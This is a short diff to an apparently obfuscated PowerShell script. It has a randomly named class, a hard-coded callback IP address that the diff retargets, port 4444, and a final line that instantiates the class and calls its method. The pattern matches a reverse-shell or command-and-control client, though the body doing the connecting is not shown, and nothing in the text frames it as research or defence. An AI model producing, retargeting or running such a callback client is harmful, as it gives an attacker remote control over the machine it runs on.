@@ -1,6 +1,6 @@
 class epfJNQHiTkN {
     
-    [string]$NzBcvDOzdIZ = "10.18.8.228"
+    [string]$NzBcvDOzdIZ = "10.18.9.228"
     [int]$jkiGObmBMNMuSzup = 4444
 
     $GoLMB
@@ -97,3 +97,4 @@ class epfJNQHiTkN {
 
 $YSTJwE = [epfJNQHiTkN]::new()
 $YSTJwE.BBhEZCMgCyE()
+
